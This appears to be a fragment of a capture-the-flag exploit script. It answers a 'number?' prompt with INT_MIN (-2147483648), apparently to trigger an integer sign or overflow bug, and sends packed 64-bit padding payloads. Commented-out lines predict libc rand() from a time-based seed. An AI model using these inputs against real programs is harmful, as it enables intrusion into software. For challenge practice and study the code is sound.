ru("number?")
sl(b'-2147483648')
sl(p64(1) + b'a' * 0x8 + p64(1))


# libc = cdll.LoadLibrary("libc.so.6")
#
#
# libc.srand(libc.time(0))
# rand_result = str(libc.rand())
# print(rand_result)
# rand_len = str(len(rand_result)+1)
# print(rand_len)